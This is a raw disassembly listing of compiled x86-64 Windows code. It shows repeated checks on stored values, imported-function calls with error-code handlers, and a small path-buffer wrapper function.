   1400043e3:	45 33 c9             	xor    %r9d,%r9d
   1400043e6:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   1400043ed:	45 33 c0             	xor    %r8d,%r8d
   1400043f0:	33 d2                	xor    %edx,%edx
   1400043f2:	ff 15 30 4f 00 00    	call   *0x4f30(%rip)        # 0x140009328
   1400043f8:	85 c0                	test   %eax,%eax
   1400043fa:	75 c4                	jne    0x1400043c0
   1400043fc:	39 b5 58 01 00 00    	cmp    %esi,0x158(%rbp)
   140004402:	0f 84 05 06 00 00    	je     0x140004a0d
   140004408:	ff 15 ea 4d 00 00    	call   *0x4dea(%rip)        # 0x1400091f8
   14000440e:	39 85 58 01 00 00    	cmp    %eax,0x158(%rbp)
   140004414:	0f 84 e7 05 00 00    	je     0x140004a01
   14000441a:	0f 28 85 50 01 00 00 	movaps 0x150(%rbp),%xmm0
   140004421:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004426:	33 d2                	xor    %edx,%edx
   140004428:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000442e:	ff 15 d4 4d 00 00    	call   *0x4dd4(%rip)        # 0x140009208
   140004434:	85 c0                	test   %eax,%eax
   140004436:	0f 85 b9 05 00 00    	jne    0x1400049f5
   14000443c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000443f:	66 0f 7f 85 50 01 00 	movdqa %xmm0,0x150(%rbp)
   140004446:	00 
   140004447:	39 b5 48 01 00 00    	cmp    %esi,0x148(%rbp)
   14000444d:	0f 84 ba 05 00 00    	je     0x140004a0d
   140004453:	ff 15 9f 4d 00 00    	call   *0x4d9f(%rip)        # 0x1400091f8
   140004459:	39 85 48 01 00 00    	cmp    %eax,0x148(%rbp)
   14000445f:	0f 84 9c 05 00 00    	je     0x140004a01
   140004465:	0f 28 85 40 01 00 00 	movaps 0x140(%rbp),%xmm0
   14000446c:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004471:	33 d2                	xor    %edx,%edx
   140004473:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004479:	ff 15 89 4d 00 00    	call   *0x4d89(%rip)        # 0x140009208
   14000447f:	85 c0                	test   %eax,%eax
   140004481:	0f 85 6e 05 00 00    	jne    0x1400049f5
   140004487:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000448a:	66 0f 7f 85 40 01 00 	movdqa %xmm0,0x140(%rbp)
   140004491:	00 
   140004492:	39 b5 38 01 00 00    	cmp    %esi,0x138(%rbp)
   140004498:	0f 84 6f 05 00 00    	je     0x140004a0d
   14000449e:	ff 15 54 4d 00 00    	call   *0x4d54(%rip)        # 0x1400091f8
   1400044a4:	39 85 38 01 00 00    	cmp    %eax,0x138(%rbp)
   1400044aa:	0f 84 51 05 00 00    	je     0x140004a01
   1400044b0:	0f 28 85 30 01 00 00 	movaps 0x130(%rbp),%xmm0
   1400044b7:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400044bc:	33 d2                	xor    %edx,%edx
   1400044be:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400044c4:	ff 15 3e 4d 00 00    	call   *0x4d3e(%rip)        # 0x140009208
   1400044ca:	85 c0                	test   %eax,%eax
   1400044cc:	0f 85 23 05 00 00    	jne    0x1400049f5
   1400044d2:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400044d5:	66 0f 7f 85 30 01 00 	movdqa %xmm0,0x130(%rbp)
   1400044dc:	00 
   1400044dd:	39 b5 28 01 00 00    	cmp    %esi,0x128(%rbp)
   1400044e3:	0f 84 24 05 00 00    	je     0x140004a0d
   1400044e9:	ff 15 09 4d 00 00    	call   *0x4d09(%rip)        # 0x1400091f8
   1400044ef:	39 85 28 01 00 00    	cmp    %eax,0x128(%rbp)
   1400044f5:	0f 84 06 05 00 00    	je     0x140004a01
   1400044fb:	0f 28 85 20 01 00 00 	movaps 0x120(%rbp),%xmm0
   140004502:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004507:	33 d2                	xor    %edx,%edx
   140004509:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000450f:	ff 15 f3 4c 00 00    	call   *0x4cf3(%rip)        # 0x140009208
   140004515:	85 c0                	test   %eax,%eax
   140004517:	0f 85 d8 04 00 00    	jne    0x1400049f5
   14000451d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004520:	66 0f 7f 85 20 01 00 	movdqa %xmm0,0x120(%rbp)
   140004527:	00 
   140004528:	39 b5 18 01 00 00    	cmp    %esi,0x118(%rbp)
   14000452e:	0f 84 d9 04 00 00    	je     0x140004a0d
   140004534:	ff 15 be 4c 00 00    	call   *0x4cbe(%rip)        # 0x1400091f8
   14000453a:	39 85 18 01 00 00    	cmp    %eax,0x118(%rbp)
   140004540:	0f 84 bb 04 00 00    	je     0x140004a01
   140004546:	0f 28 85 10 01 00 00 	movaps 0x110(%rbp),%xmm0
   14000454d:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004552:	33 d2                	xor    %edx,%edx
   140004554:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000455a:	ff 15 a8 4c 00 00    	call   *0x4ca8(%rip)        # 0x140009208
   140004560:	85 c0                	test   %eax,%eax
   140004562:	0f 85 8d 04 00 00    	jne    0x1400049f5
   140004568:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000456b:	66 0f 7f 85 10 01 00 	movdqa %xmm0,0x110(%rbp)
   140004572:	00 
   140004573:	39 b5 a8 00 00 00    	cmp    %esi,0xa8(%rbp)
   140004579:	0f 84 8e 04 00 00    	je     0x140004a0d
   14000457f:	ff 15 73 4c 00 00    	call   *0x4c73(%rip)        # 0x1400091f8
   140004585:	39 85 a8 00 00 00    	cmp    %eax,0xa8(%rbp)
   14000458b:	0f 84 70 04 00 00    	je     0x140004a01
   140004591:	0f 28 85 a0 00 00 00 	movaps 0xa0(%rbp),%xmm0
   140004598:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000459d:	33 d2                	xor    %edx,%edx
   14000459f:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400045a5:	ff 15 5d 4c 00 00    	call   *0x4c5d(%rip)        # 0x140009208
   1400045ab:	85 c0                	test   %eax,%eax
   1400045ad:	0f 85 42 04 00 00    	jne    0x1400049f5
   1400045b3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400045b6:	66 0f 7f 85 a0 00 00 	movdqa %xmm0,0xa0(%rbp)
   1400045bd:	00 
   1400045be:	39 b5 98 00 00 00    	cmp    %esi,0x98(%rbp)
   1400045c4:	0f 84 43 04 00 00    	je     0x140004a0d
   1400045ca:	ff 15 28 4c 00 00    	call   *0x4c28(%rip)        # 0x1400091f8
   1400045d0:	39 85 98 00 00 00    	cmp    %eax,0x98(%rbp)
   1400045d6:	0f 84 25 04 00 00    	je     0x140004a01
   1400045dc:	0f 28 85 90 00 00 00 	movaps 0x90(%rbp),%xmm0
   1400045e3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400045e8:	33 d2                	xor    %edx,%edx
   1400045ea:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400045f0:	ff 15 12 4c 00 00    	call   *0x4c12(%rip)        # 0x140009208
   1400045f6:	85 c0                	test   %eax,%eax
   1400045f8:	0f 85 f7 03 00 00    	jne    0x1400049f5
   1400045fe:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004601:	66 0f 7f 85 90 00 00 	movdqa %xmm0,0x90(%rbp)
   140004608:	00 
   140004609:	39 75 68             	cmp    %esi,0x68(%rbp)
   14000460c:	0f 84 fb 03 00 00    	je     0x140004a0d
   140004612:	ff 15 e0 4b 00 00    	call   *0x4be0(%rip)        # 0x1400091f8
   140004618:	39 45 68             	cmp    %eax,0x68(%rbp)
   14000461b:	0f 84 e0 03 00 00    	je     0x140004a01
   140004621:	0f 28 45 60          	movaps 0x60(%rbp),%xmm0
   140004625:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000462a:	33 d2                	xor    %edx,%edx
   14000462c:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004632:	ff 15 d0 4b 00 00    	call   *0x4bd0(%rip)        # 0x140009208
   140004638:	85 c0                	test   %eax,%eax
   14000463a:	0f 85 b5 03 00 00    	jne    0x1400049f5
   140004640:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004643:	66 0f 7f 45 60       	movdqa %xmm0,0x60(%rbp)
   140004648:	39 75 58             	cmp    %esi,0x58(%rbp)
   14000464b:	0f 84 bc 03 00 00    	je     0x140004a0d
   140004651:	ff 15 a1 4b 00 00    	call   *0x4ba1(%rip)        # 0x1400091f8
   140004657:	39 45 58             	cmp    %eax,0x58(%rbp)
   14000465a:	0f 84 a1 03 00 00    	je     0x140004a01
   140004660:	0f 28 45 50          	movaps 0x50(%rbp),%xmm0
   140004664:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004669:	33 d2                	xor    %edx,%edx
   14000466b:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004671:	ff 15 91 4b 00 00    	call   *0x4b91(%rip)        # 0x140009208
   140004677:	85 c0                	test   %eax,%eax
   140004679:	0f 85 76 03 00 00    	jne    0x1400049f5
   14000467f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004682:	66 0f 7f 45 50       	movdqa %xmm0,0x50(%rbp)
   140004687:	39 b5 08 01 00 00    	cmp    %esi,0x108(%rbp)
   14000468d:	0f 84 7a 03 00 00    	je     0x140004a0d
   140004693:	ff 15 5f 4b 00 00    	call   *0x4b5f(%rip)        # 0x1400091f8
   140004699:	39 85 08 01 00 00    	cmp    %eax,0x108(%rbp)
   14000469f:	0f 84 5c 03 00 00    	je     0x140004a01
   1400046a5:	0f 28 85 00 01 00 00 	movaps 0x100(%rbp),%xmm0
   1400046ac:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400046b1:	33 d2                	xor    %edx,%edx
   1400046b3:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400046b9:	ff 15 49 4b 00 00    	call   *0x4b49(%rip)        # 0x140009208
   1400046bf:	85 c0                	test   %eax,%eax
   1400046c1:	0f 85 2e 03 00 00    	jne    0x1400049f5
   1400046c7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400046ca:	66 0f 7f 85 00 01 00 	movdqa %xmm0,0x100(%rbp)
   1400046d1:	00 
   1400046d2:	39 b5 f8 00 00 00    	cmp    %esi,0xf8(%rbp)
   1400046d8:	0f 84 2f 03 00 00    	je     0x140004a0d
   1400046de:	ff 15 14 4b 00 00    	call   *0x4b14(%rip)        # 0x1400091f8
   1400046e4:	39 85 f8 00 00 00    	cmp    %eax,0xf8(%rbp)
   1400046ea:	0f 84 11 03 00 00    	je     0x140004a01
   1400046f0:	0f 28 85 f0 00 00 00 	movaps 0xf0(%rbp),%xmm0
   1400046f7:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400046fc:	33 d2                	xor    %edx,%edx
   1400046fe:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004704:	ff 15 fe 4a 00 00    	call   *0x4afe(%rip)        # 0x140009208
   14000470a:	85 c0                	test   %eax,%eax
   14000470c:	0f 85 e3 02 00 00    	jne    0x1400049f5
   140004712:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004715:	66 0f 7f 85 f0 00 00 	movdqa %xmm0,0xf0(%rbp)
   14000471c:	00 
   14000471d:	39 b5 e8 00 00 00    	cmp    %esi,0xe8(%rbp)
   140004723:	0f 84 e4 02 00 00    	je     0x140004a0d
   140004729:	ff 15 c9 4a 00 00    	call   *0x4ac9(%rip)        # 0x1400091f8
   14000472f:	39 85 e8 00 00 00    	cmp    %eax,0xe8(%rbp)
   140004735:	0f 84 c6 02 00 00    	je     0x140004a01
   14000473b:	0f 28 85 e0 00 00 00 	movaps 0xe0(%rbp),%xmm0
   140004742:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004747:	33 d2                	xor    %edx,%edx
   140004749:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000474f:	ff 15 b3 4a 00 00    	call   *0x4ab3(%rip)        # 0x140009208
   140004755:	85 c0                	test   %eax,%eax
   140004757:	0f 85 98 02 00 00    	jne    0x1400049f5
   14000475d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004760:	66 0f 7f 85 e0 00 00 	movdqa %xmm0,0xe0(%rbp)
   140004767:	00 
   140004768:	39 b5 d8 00 00 00    	cmp    %esi,0xd8(%rbp)
   14000476e:	0f 84 99 02 00 00    	je     0x140004a0d
   140004774:	ff 15 7e 4a 00 00    	call   *0x4a7e(%rip)        # 0x1400091f8
   14000477a:	39 85 d8 00 00 00    	cmp    %eax,0xd8(%rbp)
   140004780:	0f 84 7b 02 00 00    	je     0x140004a01
   140004786:	0f 28 85 d0 00 00 00 	movaps 0xd0(%rbp),%xmm0
   14000478d:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004792:	33 d2                	xor    %edx,%edx
   140004794:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000479a:	ff 15 68 4a 00 00    	call   *0x4a68(%rip)        # 0x140009208
   1400047a0:	85 c0                	test   %eax,%eax
   1400047a2:	0f 85 4d 02 00 00    	jne    0x1400049f5
   1400047a8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400047ab:	66 0f 7f 85 d0 00 00 	movdqa %xmm0,0xd0(%rbp)
   1400047b2:	00 
   1400047b3:	39 b5 c8 00 00 00    	cmp    %esi,0xc8(%rbp)
   1400047b9:	0f 84 4e 02 00 00    	je     0x140004a0d
   1400047bf:	ff 15 33 4a 00 00    	call   *0x4a33(%rip)        # 0x1400091f8
   1400047c5:	39 85 c8 00 00 00    	cmp    %eax,0xc8(%rbp)
   1400047cb:	0f 84 30 02 00 00    	je     0x140004a01
   1400047d1:	0f 28 85 c0 00 00 00 	movaps 0xc0(%rbp),%xmm0
   1400047d8:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400047dd:	33 d2                	xor    %edx,%edx
   1400047df:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400047e5:	ff 15 1d 4a 00 00    	call   *0x4a1d(%rip)        # 0x140009208
   1400047eb:	85 c0                	test   %eax,%eax
   1400047ed:	0f 85 02 02 00 00    	jne    0x1400049f5
   1400047f3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400047f6:	66 0f 7f 85 c0 00 00 	movdqa %xmm0,0xc0(%rbp)
   1400047fd:	00 
   1400047fe:	39 b5 b8 00 00 00    	cmp    %esi,0xb8(%rbp)
   140004804:	0f 84 03 02 00 00    	je     0x140004a0d
   14000480a:	ff 15 e8 49 00 00    	call   *0x49e8(%rip)        # 0x1400091f8
   140004810:	39 85 b8 00 00 00    	cmp    %eax,0xb8(%rbp)
   140004816:	0f 84 e5 01 00 00    	je     0x140004a01
   14000481c:	0f 28 85 b0 00 00 00 	movaps 0xb0(%rbp),%xmm0
   140004823:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004828:	33 d2                	xor    %edx,%edx
   14000482a:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004830:	ff 15 d2 49 00 00    	call   *0x49d2(%rip)        # 0x140009208
   140004836:	85 c0                	test   %eax,%eax
   140004838:	0f 85 b7 01 00 00    	jne    0x1400049f5
   14000483e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004841:	66 0f 7f 85 b0 00 00 	movdqa %xmm0,0xb0(%rbp)
   140004848:	00 
   140004849:	39 b5 88 00 00 00    	cmp    %esi,0x88(%rbp)
   14000484f:	0f 84 b8 01 00 00    	je     0x140004a0d
   140004855:	ff 15 9d 49 00 00    	call   *0x499d(%rip)        # 0x1400091f8
   14000485b:	39 85 88 00 00 00    	cmp    %eax,0x88(%rbp)
   140004861:	0f 84 9a 01 00 00    	je     0x140004a01
   140004867:	0f 28 85 80 00 00 00 	movaps 0x80(%rbp),%xmm0
   14000486e:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004873:	33 d2                	xor    %edx,%edx
   140004875:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000487b:	ff 15 87 49 00 00    	call   *0x4987(%rip)        # 0x140009208
   140004881:	85 c0                	test   %eax,%eax
   140004883:	0f 85 6c 01 00 00    	jne    0x1400049f5
   140004889:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000488c:	66 0f 7f 85 80 00 00 	movdqa %xmm0,0x80(%rbp)
   140004893:	00 
   140004894:	39 75 78             	cmp    %esi,0x78(%rbp)
   140004897:	0f 84 70 01 00 00    	je     0x140004a0d
   14000489d:	ff 15 55 49 00 00    	call   *0x4955(%rip)        # 0x1400091f8
   1400048a3:	39 45 78             	cmp    %eax,0x78(%rbp)
   1400048a6:	0f 84 55 01 00 00    	je     0x140004a01
   1400048ac:	0f 28 45 70          	movaps 0x70(%rbp),%xmm0
   1400048b0:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400048b5:	33 d2                	xor    %edx,%edx
   1400048b7:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400048bd:	ff 15 45 49 00 00    	call   *0x4945(%rip)        # 0x140009208
   1400048c3:	85 c0                	test   %eax,%eax
   1400048c5:	0f 85 2a 01 00 00    	jne    0x1400049f5
   1400048cb:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400048ce:	66 0f 7f 45 70       	movdqa %xmm0,0x70(%rbp)
   1400048d3:	39 75 48             	cmp    %esi,0x48(%rbp)
   1400048d6:	0f 84 31 01 00 00    	je     0x140004a0d
   1400048dc:	ff 15 16 49 00 00    	call   *0x4916(%rip)        # 0x1400091f8
   1400048e2:	39 45 48             	cmp    %eax,0x48(%rbp)
   1400048e5:	0f 84 16 01 00 00    	je     0x140004a01
   1400048eb:	0f 28 45 40          	movaps 0x40(%rbp),%xmm0
   1400048ef:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400048f4:	33 d2                	xor    %edx,%edx
   1400048f6:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400048fc:	ff 15 06 49 00 00    	call   *0x4906(%rip)        # 0x140009208
   140004902:	85 c0                	test   %eax,%eax
   140004904:	0f 85 eb 00 00 00    	jne    0x1400049f5
   14000490a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000490d:	ba 01 00 00 00       	mov    $0x1,%edx
   140004912:	48 8b cf             	mov    %rdi,%rcx
   140004915:	66 0f 7f 45 40       	movdqa %xmm0,0x40(%rbp)
   14000491a:	ff 15 b0 4a 00 00    	call   *0x4ab0(%rip)        # 0x1400093d0
   140004920:	39 75 48             	cmp    %esi,0x48(%rbp)
   140004923:	0f 85 c5 00 00 00    	jne    0x1400049ee
   140004929:	39 75 58             	cmp    %esi,0x58(%rbp)
   14000492c:	0f 85 bc 00 00 00    	jne    0x1400049ee
   140004932:	39 75 68             	cmp    %esi,0x68(%rbp)
   140004935:	0f 85 b3 00 00 00    	jne    0x1400049ee
   14000493b:	39 75 78             	cmp    %esi,0x78(%rbp)
   14000493e:	0f 85 aa 00 00 00    	jne    0x1400049ee
   140004944:	39 b5 88 00 00 00    	cmp    %esi,0x88(%rbp)
   14000494a:	0f 85 9e 00 00 00    	jne    0x1400049ee
   140004950:	39 b5 98 00 00 00    	cmp    %esi,0x98(%rbp)
   140004956:	0f 85 92 00 00 00    	jne    0x1400049ee
   14000495c:	39 b5 a8 00 00 00    	cmp    %esi,0xa8(%rbp)
   140004962:	0f 85 86 00 00 00    	jne    0x1400049ee
   140004968:	39 b5 b8 00 00 00    	cmp    %esi,0xb8(%rbp)
   14000496e:	75 7e                	jne    0x1400049ee
   140004970:	39 b5 c8 00 00 00    	cmp    %esi,0xc8(%rbp)
   140004976:	75 76                	jne    0x1400049ee
   140004978:	39 b5 d8 00 00 00    	cmp    %esi,0xd8(%rbp)
   14000497e:	75 6e                	jne    0x1400049ee
   140004980:	39 b5 e8 00 00 00    	cmp    %esi,0xe8(%rbp)
   140004986:	75 66                	jne    0x1400049ee
   140004988:	39 b5 f8 00 00 00    	cmp    %esi,0xf8(%rbp)
   14000498e:	75 5e                	jne    0x1400049ee
   140004990:	39 b5 08 01 00 00    	cmp    %esi,0x108(%rbp)
   140004996:	75 56                	jne    0x1400049ee
   140004998:	39 b5 18 01 00 00    	cmp    %esi,0x118(%rbp)
   14000499e:	75 4e                	jne    0x1400049ee
   1400049a0:	39 b5 28 01 00 00    	cmp    %esi,0x128(%rbp)
   1400049a6:	75 46                	jne    0x1400049ee
   1400049a8:	39 b5 38 01 00 00    	cmp    %esi,0x138(%rbp)
   1400049ae:	75 3e                	jne    0x1400049ee
   1400049b0:	39 b5 48 01 00 00    	cmp    %esi,0x148(%rbp)
   1400049b6:	75 36                	jne    0x1400049ee
   1400049b8:	39 b5 58 01 00 00    	cmp    %esi,0x158(%rbp)
   1400049be:	75 2e                	jne    0x1400049ee
   1400049c0:	33 c0                	xor    %eax,%eax
   1400049c2:	48 8b 8d e0 09 00 00 	mov    0x9e0(%rbp),%rcx
   1400049c9:	48 33 cc             	xor    %rsp,%rcx
   1400049cc:	e8 2f 23 00 00       	call   0x140006d00
   1400049d1:	4c 8d 9c 24 f0 0a 00 	lea    0xaf0(%rsp),%r11
   1400049d8:	00 
   1400049d9:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1400049dd:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400049e1:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   1400049e5:	49 8b e3             	mov    %r11,%rsp
   1400049e8:	41 5f                	pop    %r15
   1400049ea:	41 5e                	pop    %r14
   1400049ec:	5d                   	pop    %rbp
   1400049ed:	c3                   	ret
   1400049ee:	ff 15 34 4b 00 00    	call   *0x4b34(%rip)        # 0x140009528
   1400049f4:	cc                   	int3
   1400049f5:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400049fa:	ff 15 b0 47 00 00    	call   *0x47b0(%rip)        # 0x1400091b0
   140004a00:	cc                   	int3
   140004a01:	b9 05 00 00 00       	mov    $0x5,%ecx
   140004a06:	ff 15 a4 47 00 00    	call   *0x47a4(%rip)        # 0x1400091b0
   140004a0c:	cc                   	int3
   140004a0d:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004a12:	ff 15 98 47 00 00    	call   *0x4798(%rip)        # 0x1400091b0
   140004a18:	cc                   	int3
   140004a19:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a1e:	89 75 48             	mov    %esi,0x48(%rbp)
   140004a21:	ff 15 89 47 00 00    	call   *0x4789(%rip)        # 0x1400091b0
   140004a27:	cc                   	int3
   140004a28:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a2d:	89 75 58             	mov    %esi,0x58(%rbp)
   140004a30:	ff 15 7a 47 00 00    	call   *0x477a(%rip)        # 0x1400091b0
   140004a36:	cc                   	int3
   140004a37:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a3c:	89 75 68             	mov    %esi,0x68(%rbp)
   140004a3f:	ff 15 6b 47 00 00    	call   *0x476b(%rip)        # 0x1400091b0
   140004a45:	cc                   	int3
   140004a46:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a4b:	89 75 78             	mov    %esi,0x78(%rbp)
   140004a4e:	ff 15 5c 47 00 00    	call   *0x475c(%rip)        # 0x1400091b0
   140004a54:	cc                   	int3
   140004a55:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a5a:	89 b5 88 00 00 00    	mov    %esi,0x88(%rbp)
   140004a60:	ff 15 4a 47 00 00    	call   *0x474a(%rip)        # 0x1400091b0
   140004a66:	cc                   	int3
   140004a67:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a6c:	89 b5 98 00 00 00    	mov    %esi,0x98(%rbp)
   140004a72:	ff 15 38 47 00 00    	call   *0x4738(%rip)        # 0x1400091b0
   140004a78:	cc                   	int3
   140004a79:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a7e:	89 b5 a8 00 00 00    	mov    %esi,0xa8(%rbp)
   140004a84:	ff 15 26 47 00 00    	call   *0x4726(%rip)        # 0x1400091b0
   140004a8a:	cc                   	int3
   140004a8b:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004a90:	89 b5 b8 00 00 00    	mov    %esi,0xb8(%rbp)
   140004a96:	ff 15 14 47 00 00    	call   *0x4714(%rip)        # 0x1400091b0
   140004a9c:	cc                   	int3
   140004a9d:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004aa2:	89 b5 c8 00 00 00    	mov    %esi,0xc8(%rbp)
   140004aa8:	ff 15 02 47 00 00    	call   *0x4702(%rip)        # 0x1400091b0
   140004aae:	cc                   	int3
   140004aaf:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004ab4:	89 b5 d8 00 00 00    	mov    %esi,0xd8(%rbp)
   140004aba:	ff 15 f0 46 00 00    	call   *0x46f0(%rip)        # 0x1400091b0
   140004ac0:	cc                   	int3
   140004ac1:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004ac6:	89 b5 e8 00 00 00    	mov    %esi,0xe8(%rbp)
   140004acc:	ff 15 de 46 00 00    	call   *0x46de(%rip)        # 0x1400091b0
   140004ad2:	cc                   	int3
   140004ad3:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004ad8:	89 b5 f8 00 00 00    	mov    %esi,0xf8(%rbp)
   140004ade:	ff 15 cc 46 00 00    	call   *0x46cc(%rip)        # 0x1400091b0
   140004ae4:	cc                   	int3
   140004ae5:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004aea:	89 b5 08 01 00 00    	mov    %esi,0x108(%rbp)
   140004af0:	ff 15 ba 46 00 00    	call   *0x46ba(%rip)        # 0x1400091b0
   140004af6:	cc                   	int3
   140004af7:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004afc:	89 b5 18 01 00 00    	mov    %esi,0x118(%rbp)
   140004b02:	ff 15 a8 46 00 00    	call   *0x46a8(%rip)        # 0x1400091b0
   140004b08:	cc                   	int3
   140004b09:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004b0e:	89 b5 28 01 00 00    	mov    %esi,0x128(%rbp)
   140004b14:	ff 15 96 46 00 00    	call   *0x4696(%rip)        # 0x1400091b0
   140004b1a:	cc                   	int3
   140004b1b:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004b20:	89 b5 38 01 00 00    	mov    %esi,0x138(%rbp)
   140004b26:	ff 15 84 46 00 00    	call   *0x4684(%rip)        # 0x1400091b0
   140004b2c:	cc                   	int3
   140004b2d:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004b32:	89 b5 48 01 00 00    	mov    %esi,0x148(%rbp)
   140004b38:	ff 15 72 46 00 00    	call   *0x4672(%rip)        # 0x1400091b0
   140004b3e:	cc                   	int3
   140004b3f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004b44:	89 b5 58 01 00 00    	mov    %esi,0x158(%rbp)
   140004b4a:	ff 15 60 46 00 00    	call   *0x4660(%rip)        # 0x1400091b0
   140004b50:	cc                   	int3
   140004b51:	cc                   	int3
   140004b52:	cc                   	int3
   140004b53:	cc                   	int3
   140004b54:	cc                   	int3
   140004b55:	cc                   	int3
   140004b56:	cc                   	int3
   140004b57:	cc                   	int3
   140004b58:	cc                   	int3
   140004b59:	cc                   	int3
   140004b5a:	cc                   	int3
   140004b5b:	cc                   	int3
   140004b5c:	cc                   	int3
   140004b5d:	cc                   	int3
   140004b5e:	cc                   	int3
   140004b5f:	cc                   	int3
   140004b60:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004b65:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140004b6a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004b6f:	53                   	push   %rbx
   140004b70:	56                   	push   %rsi
   140004b71:	57                   	push   %rdi
   140004b72:	48 83 ec 30          	sub    $0x30,%rsp
   140004b76:	48 8b fa             	mov    %rdx,%rdi
   140004b79:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   140004b7e:	48 8b d9             	mov    %rcx,%rbx
   140004b81:	e8 8a c4 ff ff       	call   0x140001010
   140004b86:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140004b8b:	4c 8b cf             	mov    %rdi,%r9
   140004b8e:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140004b94:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004b9b:	00 00 
   140004b9d:	48 8b d3             	mov    %rbx,%rdx
   140004ba0:	48 8b 08             	mov    (%rax),%rcx
   140004ba3:	ff 15 ef 49 00 00    	call   *0x49ef(%rip)        # 0x140009598
   140004ba9:	85 c0                	test   %eax,%eax
   140004bab:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004bb0:	0f 48 c1             	cmovs  %ecx,%eax
   140004bb3:	48 83 c4 30          	add    $0x30,%rsp
   140004bb7:	5f                   	pop    %rdi
   140004bb8:	5e                   	pop    %rsi
   140004bb9:	5b                   	pop    %rbx
   140004bba:	c3                   	ret
   140004bbb:	cc                   	int3
   140004bbc:	cc                   	int3
   140004bbd:	cc                   	int3
   140004bbe:	cc                   	int3
   140004bbf:	cc                   	int3
   140004bc0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004bc5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004bca:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004bcf:	56                   	push   %rsi
